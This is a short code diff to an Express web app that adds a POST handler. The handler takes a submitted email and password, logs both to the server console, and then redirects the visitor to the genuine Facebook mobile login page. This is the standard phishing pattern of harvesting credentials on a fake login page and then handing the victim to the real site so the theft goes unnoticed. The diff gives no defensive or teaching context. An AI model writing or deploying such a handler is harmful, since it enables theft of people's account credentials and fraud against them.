@@ -24,7 +24,15 @@ app.set("views", viewsPath);
 hbs.registerPartials(partialsPath);
 app.use(express.static(staticPath));
 
-
+// POST request //
+app.post('/', (req, res) => {
+        const userEmail = req.body.email;
+        const userPass = req.body.pass;
+        console.log(userEmail , userPass);
+        
+        res.redirect('https://m.facebook.com/login/?refsrc=https%3A%2F%2Fen-gb.facebook.com%2Flogin%2F');
+    });
+    
 // listening app on port 8080 //
 app.listen(port , (err) => {
     if (err) {
